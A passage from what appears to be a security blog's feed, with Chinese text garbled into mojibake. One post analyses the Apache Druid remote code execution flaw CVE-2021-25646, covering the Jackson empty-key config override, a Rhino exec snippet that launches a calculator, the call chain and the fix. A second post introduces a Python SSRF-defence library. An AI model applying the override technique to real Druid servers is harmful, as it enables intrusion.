å…¥é”®ä¸ºâ€â€çš„jsonå¯¹è±¡æ—¶å°±ä¼šè¢«è§£æåˆ°å¯¹åº”çš„å‚æ•°ä¸Šã€‚</p></blockquote><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>å…¶ä¸­ä¸è¯¥æ¼æ´ç›¸å…³çš„æ³¨è§£å¦‚ä¸‹</p><ul><li>JsonCreator</li><li>JsonProperty</li><li>JacksonInject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JavaScriptConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person4</span><span class="params">(<span class="meta">@JsonProperty(&quot;age&quot;)</span> <span class="keyword">int</span> age,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JsonProperty(&quot;name&quot;)</span> String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JacksonInject</span> JavaScriptConfig config)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User [name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;, config=&quot;</span> + config.toString() + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String sp4 = <span class="string">&quot;&#123;\&quot;enabled\&quot;:true&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper4 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            JavaScriptConfig pp4 = mapper4.readValue(sp4, JavaScriptConfig.class);</span><br><span class="line">            System.out.println(pp4);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">            String sp5 = <span class="string">&quot;&#123;\&quot;age\&quot;:10,\&quot;name\&quot;:\&quot;m0d9\&quot;,\&quot;\&quot;:&#123;\&quot;enabled\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper5 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            Person4 pp5 = mapper5.readValue(sp5, Person4.class);</span><br><span class="line">            System.out.println(pp5);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScriptConfig&#123;enabled&#x3D;true&#125;</span><br><span class="line">---------------------------</span><br><span class="line">User [name&#x3D;m0d9, age&#x3D;10, config&#x3D;JavaScriptConfig&#123;enabled&#x3D;true&#125;]</span><br></pre></td></tr></table></figure><h4 id="Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª"><a href="#Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª" class="headerlink" title="Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª"></a>Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª</h4><p>çš„ç¡®å¦‚Litch1æ‰€è¨€ï¼Œkeyä¸ºâ€â€çš„value({â€œenabledâ€:true})è¢«jacksonååºåˆ—åŒ–ä¹‹åèµ‹å€¼ç»™configã€‚ä¸ºä½•å¦‚æ­¤ï¼Ÿè·Ÿè¸ªä¸‹Jackson JsonCreatorçš„é€»è¾‘</p><p>ä½œè€…ä¹Ÿæœ‰ç»™å‡ºå¯¹åº”çš„å…³é”®è¿‡ç¨‹</p><blockquote><p>com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBasedåœ¨è§£æçš„è¿‡ç¨‹ä¸­ï¼Œä¼šæ‹¿è§£æåˆ°çš„jsonä¸²ä¸­çš„â€œé”®åâ€å»æŸ¥æ‰¾å½“å‰è§£æå¯¹è±¡ä¸­å¯¹åº”çš„creatorPropertyï¼Œè¿™æ­¥å¯¹åº”çš„æ˜¯findCreatorPropertyæ–¹æ³•ï¼ŒfindCreatorPropertyæ–¹æ³•ä¼šå»_propertyLookup è¿™ä¸ªHashMapä¸­æŸ¥æ‰¾â€é”®åâ€å¯¹åº”çš„å±æ€§ï¼Œåœ¨_propertyLookupä¸­å¯ä»¥çœ‹åˆ°å…¶ä¸­æ²¡æœ‰ç”¨JsonPropertyæ³¨é‡Šä¿®é¥°çš„JavaScriptConfigçš„é”®ä¸ºâ€â€ï¼Œè¦æ˜¯jsonä¸²ä¸­çš„é”®ä¹Ÿä¸ºâ€â€ï¼Œå°±èƒ½åŒ¹é…ä¸Šï¼Œå–å‡ºJavaScriptConfigå¯¹åº”çš„creatorProperty</p></blockquote><p>ç®€å•è€Œè¨€ï¼ŒJacksonååºåˆ—åŒ–è¿‡ç¨‹åŸºæœ¬å¦‚ä¸‹</p><ol><li>è°ƒç”¨mapper.readValue(jsonString, DstClass.class)</li><li>åˆ†æDstClassï¼Œæœ‰å“ªäº›å±æ€§Propertyï¼Œä»¥åŠè¿™äº›å±æ€§å¯¹åº”çš„setæ–¹æ³•(creatorProperty)æ˜¯ä»€ä¹ˆ</li><li>ä¾æ¬¡è¯»å–jsonString key &amp; valueï¼Œæ ¹æ®æ­¥éª¤2ä¸­keyå¯¹åº”çš„setæ–¹æ³•ï¼Œè°ƒç”¨å¹¶åˆ›å»ºã€‚</li></ol><p>å…¶ä¸­ï¼Œåˆ†æDstClassï¼Œåœ¨com.fasterxml.jackson.databind.deser.BeanDeserializerè¿™ä¸ªç±»ä¸­å®ç°ï¼Œæ­¥éª¤2ä¸­çš„ç»“æœä¿å­˜åœ¨BeanDeserializer#_beanProperties Mapç±»é‡Œé¢ï¼Œä¹‹åé€šè¿‡PropertyBeanCreatorè½¬æ¢ä¸ºBeanDeserializer#_propertyLookup</p><p><img src="/images/pasted-117.png" alt="upload successful"></p><p><img src="/images/pasted-118.png" alt="upload successful"></p><p><strong>å¯è§configå¯¹åº”çš„CreatorProperty nameä¸ºâ€â€ï¼Œå› æ­¤_propertyLookupç”Ÿæˆäº†nameä¸ºâ€â€,valueä¸ºconfigèµ‹å€¼å‡½æ•°çš„ä¸€æ¡è®°å½•</strong></p><p>æ­¥éª¤3ä¸­å±æ€§èµ‹å€¼ä¸­ï¼Œæ ¹æ®keyæ‰¾å¯¹åº”setæ–¹æ³•ï¼Œå…·ä½“å®ç°å‡½æ•°ä¸ºfindCreatorPropertyï¼Œå°±æ˜¯ä»_propertyLookupå¯»æ‰¾çš„ï¼Œç„¶åå®ç°å±æ€§èµ‹å€¼</p><h3 id="Rhino"><a href="#Rhino" class="headerlink" title="Rhino"></a>Rhino</h3><p>javascriptå¼•æ“ï¼Œè¿™é‡Œå’Œå‰é¢æ¯”å°±ç®€å•äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Context cx = Context.enter();</span><br><span class="line">cx.setOptimizationLevel(<span class="number">9</span>);</span><br><span class="line">ScriptableObject scope = cx.initStandardObjects();</span><br><span class="line">String script = <span class="string">&quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)&#125;&quot;</span>;</span><br><span class="line">Function fnApply = cx.compileFunction(scope, script, <span class="string">&quot;script&quot;</span>, <span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line">fnApply.call(cx,scope,scope,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">Context.exit();</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ•´ä¸ªæ¼æ´çš„ç²¾é«“æœ‰ä¸¤ç‚¹</p><h3 id="1-åˆ©ç”¨Jackson-JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter-JavaScriptConfig-configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½"><a href="#1-åˆ©ç”¨Jackson-JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter-JavaScriptConfig-configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½" class="headerlink" title="1. åˆ©ç”¨Jackson JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter JavaScriptConfig configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½"></a>1. åˆ©ç”¨Jackson JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter JavaScriptConfig configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½</h3><p>è¦†ç›–configè¿‡ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SamplerResource#SamplerResponse</span><br><span class="line">  IndexTaskSamplerSpec#IndexTaskSamplerSpec</span><br><span class="line">    IndexTask.IndexIngestionSpec#IndexIngestionSpec</span><br><span class="line">      DataSchema#DataSchema</span><br><span class="line">        TransformSpec#TransformSpec</span><br><span class="line">          JavaScriptDimFilter#JavaScriptDimFilter</span><br></pre></td></tr></table></figure><h3 id="2-JavaScriptDimFilter-toFilter-è§¦å‘å›æº¯"><a href="#2-JavaScriptDimFilter-toFilter-è§¦å‘å›æº¯" class="headerlink" title="2. JavaScriptDimFilter#toFilter è§¦å‘å›æº¯"></a>2. JavaScriptDimFilter#toFilter è§¦å‘å›æº¯</h3><p>ä½œè€…ç»™çš„pocæ˜¯å›æº¯åˆ°SamplerResource#postå¯ç”¨é“¾ï¼Œå¯¹åº”è§¦å‘çš„è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">toFilter:149, JavaScriptDimFilter (org.apache.druid.query.filter)</span><br><span class="line">&lt;init&gt;:57, Transformer (org.apache.druid.segment.transform)</span><br><span class="line">toTransformer:126, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">decorate:117, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">buildReader:209, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:106, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:94, IndexTaskSamplerSpec (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">post:41, SamplerResource (org.apache.druid.indexing.overlord.sampler)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æ¼æ´ä¿®å¤prï¼š<a href="https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0">https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0</a></p><p>å…¶ä¸­æœ€é‡è¦çš„ä¿®æ”¹åœ¨core/src/main/java/org/apache/druid/guice/GuiceAnnotationIntrospector.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> JsonIgnoreProperties.<span class="function">Value <span class="title">findPropertyIgnorals</span><span class="params">(Annotated ac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// We should not allow empty names in any case. However, there is a known bug in Jackson deserializer</span></span><br><span class="line">  <span class="comment">// with ignorals (_arrayDelegateDeserializer is not copied when creating a contextual deserializer.</span></span><br><span class="line">  <span class="comment">// See https://github.com/FasterXML/jackson-databind/issues/3022 for more details), which makes array</span></span><br><span class="line">  <span class="comment">// deserialization failed even when the array is a valid field. To work around this bug, we return</span></span><br><span class="line">  <span class="comment">// an empty ignoral when the given Annotated is a parameter with JsonProperty that needs to be deserialized.</span></span><br><span class="line">  <span class="comment">// This is valid because every property with JsonProperty annoation should have a non-empty name.</span></span><br><span class="line">  <span class="comment">// We can simply remove the below check after the Jackson bug is fixed.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// This check should be fine for so-called delegate creators that have only one argument without</span></span><br><span class="line">  <span class="comment">// JsonProperty annotation, because this method is not even called for the argument of</span></span><br><span class="line">  <span class="comment">// delegate creators. I&#x27;m not 100% sure why it&#x27;s not called, but guess it&#x27;s because the argument</span></span><br><span class="line">  <span class="comment">// is some Java type that Jackson already knows how to deserialize. Since there is only one argument,</span></span><br><span class="line">  <span class="comment">// Jackson perhaps is able to just deserialize it without introspection.</span></span><br><span class="line">  <span class="keyword">if</span> (ac <span class="keyword">instanceof</span> AnnotatedParameter) &#123;</span><br><span class="line">    <span class="keyword">final</span> AnnotatedParameter ap = (AnnotatedParameter) ac;</span><br><span class="line">    <span class="keyword">if</span> (ap.hasAnnotation(JsonProperty.class)) &#123;</span><br><span class="line">      <span class="keyword">return</span> JsonIgnoreProperties.Value.empty();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> JsonIgnoreProperties.Value.forIgnoredProperties(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éJsonPropertyä¼šåœ¨_propertyLookupè¡¨ä¸­ç”Ÿæˆä¸€æ¡è®°å½•nameä¸ºâ€â€ç©ºçš„æ˜ å°„ï¼Œæ­¤å¤„ç›´æ¥å°†éJsonPropertyçš„å±æ€§å¿½ç•¥ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰åç»­çš„JavaScriptConfigååºåˆ—åŒ–</p><h2 id="æ‰©æ•£æ€è€ƒ"><a href="#æ‰©æ•£æ€è€ƒ" class="headerlink" title="æ‰©æ•£æ€è€ƒ"></a>æ‰©æ•£æ€è€ƒ</h2><ol><li><p>Jackson nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorPropertyå˜é‡è¦†ç›–ï¼Œæ˜¯ä¸ªé€šç”¨é—®é¢˜ï¼Œå¦‚ä½•è‡ªåŠ¨åŒ–å‘ç°</p></li><li><p>å‘ç°å¯è¦†ç›–çš„å˜é‡ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦å¯åˆ©ç”¨ï¼Œç”šè‡³RCEï¼Ÿ</p></li></ol><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä»æ¼æ´äº§ç”Ÿçš„æ€è·¯ï¼Œç®€è¦åˆ†æäº†CVE-2021-25646å½¢æˆçš„æˆå› ï¼Œå³Jackson JsonCreatorçš„ç‰¹æ€§ï¼Œå’ŒDruid æ”¯æŒRhinoå¼•æ“ï¼Œå¯¼è‡´æœ€ç»ˆè¦†ç›–javascriptconfigé»˜è®¤å‚æ•°ï¼Œå¯ä»¥æ‰§è¡ŒRCEã€‚å…¶å®å’Œå‚è€ƒä¸­çš„å‡ ç¯‡åˆ†ææ–‡ç« ç›¸æ¯”æ²¡ä»€ä¹ˆå…¶ä»–æ–°çš„ä¸œè¥¿ã€‚</p><p>ä»æ¼æ´æŒ–æ˜æ€è·¯ï¼ŒçŒœæµ‹å¤§ä½¬äº‹åº”è¯¥æ˜¯å…ˆçŸ¥é“Jackson JsonCreatorçš„è¿™ä¸ªç‰¹æ€§çš„ï¼Œç„¶åç›¯ç€Rhinoå¼•æ“æäº‹æƒ…ï¼Œæ‰¾å‡ºåˆ©ç”¨é“¾ã€‚å¦‚æœäº‹å…ˆæœªçŸ¥ï¼Œä»Rhinoè¿™ç‚¹ç›´æ¥å»å•ƒJacksonï¼Œé‚£å°±æ›´åŠ ä½©æœäº†ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</a></li><li>[2] <a href="https://paper.seebug.org/1476/">æ¼æ´å¤ç°: Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (CVE-2021-25646)</a></li><li>[3] <a href="https://paper.seebug.org/1481/">Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(CVE-2021-25646)</a></li><li>[4] <a href="https://blog.csdn.net/zhaoruixiang1111/article/details/52972442">Guiceä¹‹ServletåŸºç¡€</a></li><li>[5] <a href="https://www.freebuf.com/vuls/263276.html">Apache Druidè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(CVE-2021-25646)</a></li><li>[6] <a href="https://blog.csdn.net/blwinner/article/details/98532847">Jacksonä¹‹æ³¨è§£å¤§å…¨</a></li><li>[7] <a href="https://druid.apache.org/docs/latest/development/javascript.html">JavaScript programming guide</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Litch1å¤§ä½¬çš„è¿™ä¸ªæ´æœ‰æ„æ€ï¼Œç»ˆäºæœ‰æ—¶é—´åˆ†æä¸‹ï¼Œè®°å½•ä¸‹åˆ†æè¿‡ç¨‹&lt;/p&gt;
&lt;h2 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/druid/&quot;&gt;https://archive.apache.org/dist/druid/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$wget&lt;/span&gt; https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;amp;&amp;amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ ¹æ®å‚è€ƒï¼Œä¿®æ”¹conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.configï¼Œæœ«å°¾å¢åŠ è°ƒè¯•å‚æ•°&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-Xdebug -Xnoagent -Djava.compiler&amp;#x3D;NONE -Xrunjdwp:transport&amp;#x3D;dt_socket,server&amp;#x3D;y,suspend&amp;#x3D;n,address&amp;#x3D;5005&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>pyAntiSSRFï¼špython SSRFé˜²å¾¡SDK</title>
    <link href="http://m0d9.me/2020/12/25/pyAntiSSRF/"/>
    <id>http://m0d9.me/2020/12/25/pyAntiSSRF/</id>
    <published>2020-12-25T02:34:00.000Z</published>
    <updated>2021-02-26T07:02:52.454Z</updated>
    
    <content type="html"><![CDATA[<p>å‘ç°å±…ç„¶æ²¡æœ‰ç‰¹åˆ«å¥½ç”¨çš„pythoné˜²å¾¡ssrfå¥½ç”¨çš„pipåº“ï¼Œé€ ä¸ªè½®å­</p><ul><li>æ”¯æŒpipç®€å•å®‰è£…</li><li>æ”¯æŒ py2&amp;py3</li><li>ç›´æ¥é€šè¿‡å‚æ•°å¼•ç”¨ï¼Œç›´æ¥hijackæœ€å¸¸ç”¨çš„requestsåº“ï¼Œä¸å¼•å…¥ç¬¬ä¸‰æ–¹å‡½æ•°</li><li>æ”¯æŒé˜²å¾¡DNS rebinding</li></ul><h2 id="SSRFåŸç†åŠé˜²å¾¡"><a href="#SSRFåŸç†åŠé˜²å¾¡" class="headerlink" title="SSRFåŸç†åŠé˜²å¾¡"></a>SSRFåŸç†åŠé˜²å¾¡</h2><p>ssrfæ”»å‡»åŠé˜²å¾¡è¿™é‡Œä¸å»¶ä¼¸ï¼Œå¯å‚è€ƒã€1ã€‘ï¼Œpç¥è®²çš„æŒºæ˜ç™½äº†ï¼Œæä¸¤ç‚¹</p><ol><li>åŸæ–‡æ²¡æ¶‰åŠåˆ°dns rebindingçš„é˜²å¾¡ï¼Œå…¶å®é˜²å¾¡æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œåªè¿›è¡Œ1æ¬¡dnsè¯·æ±‚å³å¯</li><li>å¾ªç¯hijack requestsè¿™ä¸ªæ€è·¯æåˆ°è¿‡ï¼Œä½†æ˜¯ä¸æ˜¯æœ€ä¼˜è§£ï¼Œå…¶å®ç›´æ¥hijack requests.sessions.Session.requestå³å¯ï¼Œæ‰€æœ‰çš„requests get/postæœ€ç»ˆéƒ½è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°</li></ol><p>å…·ä½“æ²¡å•¥å¯è¯´çš„ï¼Œçœ‹ä»£ç ã€2ã€‘å§</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p><code>pip install pyAntiSSRF</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. import &amp; patch requestsåº“</span></span><br><span class="line"><span class="keyword">import</span> pyAntiSSRF</span><br><span class="line">pyAntiSSRF.patchRequests()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. é€šè¿‡å‚æ•°anti_ssrfï¼ˆget/post/requestå‡½æ•°éƒ½æ”¯æŒï¼Œé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œæ§åˆ¶æ˜¯å¦å¼€å¯ssrfé˜²å¾¡ï¼Œå¦‚æœå¼€å¯ä¸”ç›®æ ‡ipæ˜¯å†…ç½‘ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># custom requests usage</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># patch requests by hijack requests.sessions.Session.request, default disable</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>, anti_ssrf=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>, anti_ssrf=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">è°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´</a></li><li>[2] <a href="https://github.com/yangbh/pyAntiSSRF">pyAntiSSRF</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‘ç°å±…ç„¶æ²¡æœ‰ç‰¹åˆ«å¥½ç”¨çš„pythoné˜²å¾¡ssrfå¥½ç”¨çš„pipåº“ï¼Œé€ ä¸ªè½®å­&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ”¯æŒpipç®€å•å®‰è£…&lt;/li&gt;
&lt;li&gt;æ”¯æŒ py2&amp;amp;py3&lt;/li&gt;
&lt;li&gt;ç›´æ¥é€šè¿‡å‚æ•°å¼•ç”¨ï¼Œç›´æ¥hijackæœ€å¸¸ç”¨çš„requestsåº“ï¼Œä¸å¼•å…¥ç¬¬ä¸‰æ–¹å‡½æ•°&lt;/li&gt;
&lt;li&gt;æ”¯æŒé˜²å¾¡DNS rebinding&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;SSRFåŸç†åŠé˜²å¾¡&quot;&gt;&lt;a href=&quot;#SSRFåŸç†åŠé˜²å¾¡&quot; class=&quot;headerlink&quot; title=&quot;SSRFåŸç†åŠé˜²å¾¡&quot;&gt;&lt;/a&gt;SSRFåŸç†åŠé˜²å¾¡&lt;/h2&gt;&lt;p&gt;ssrfæ”»å‡»åŠé˜²å¾¡è¿™é‡Œä¸å»¶ä¼¸ï¼Œå¯å‚è€ƒã€1ã€‘ï¼Œpç¥è®²çš„æŒºæ˜ç™½äº†ï¼Œæä¸¤ç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åŸæ–‡æ²¡æ¶‰åŠåˆ°dns rebindingçš„é˜²å¾¡ï¼Œå…¶å®é˜²å¾¡æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œåªè¿›è¡Œ1æ¬¡dnsè¯·æ±‚å³å¯&lt;/li&gt;
&lt;li&gt;å¾ªç¯hijack requestsè¿™ä¸ªæ€è·¯æåˆ°è¿‡ï¼Œä½†æ˜¯ä¸æ˜¯æœ€ä¼˜è§£ï¼Œå…¶å®ç›´æ¥hijack requests.sessions.Session.requestå³å¯ï¼Œæ‰€æœ‰çš„requests get/postæœ€ç»ˆéƒ½è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°&lt;/li&gt;
